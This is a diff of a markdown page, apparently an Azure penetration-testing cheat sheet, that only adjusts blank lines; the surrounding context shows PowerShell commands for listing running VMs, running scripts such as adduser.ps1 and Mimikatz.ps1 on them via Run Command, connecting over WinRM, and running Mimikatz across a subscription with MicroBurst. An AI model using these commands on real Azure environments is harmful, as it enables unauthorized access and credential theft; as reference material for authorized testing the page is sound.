@@ -7,6 +7,7 @@
 **Requirements**: `Microsoft.Compute/virtualMachines/runCommand/action`
 
 * List available Virtual Machines
+
     ```powershell
     PS C:\> Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
     ResourceGroupName    Name       
@@ -15,6 +16,7 @@
     ```
 
 * Get Public IP of VM by querying the network interface
+
     ```powershell
     PS AzureAD> Get-AzVM -Name <RESOURCE> -ResourceGroupName <RG-NAME> | select -ExpandProperty NetworkProfile
     PS AzureAD> Get-AzNetworkInterface -Name <RESOURCE368>
@@ -22,12 +24,14 @@
     ```
 
 * Execute Powershell script on the VM, like `adduser`
+
     ```ps1
     PS AzureAD> Invoke-AzVMRunCommand -VMName <RESOURCE> -ResourceGroupName <RG-NAME> -CommandId 'RunPowerShellScript' -ScriptPath 'C:\Tools\adduser.ps1' -Verbose
     PS Azure C:\> Invoke-AzureRmVMRunCommand -ResourceGroupName TESTRESOURCES -VMName Remote-Test -CommandId RunPowerShellScript -ScriptPath Mimikatz.ps1
     ```
 
 * Finally you should be able to connect via WinRM
+
     ```ps1
     $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force
     $creds = New-Object System.Management.Automation.PSCredential('username', $Password)
@@ -41,7 +45,6 @@ Against the whole subscription using `MicroBurst.ps1`
 Import-module MicroBurst.psm1
 Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
 ```
-
 
 ## References
 
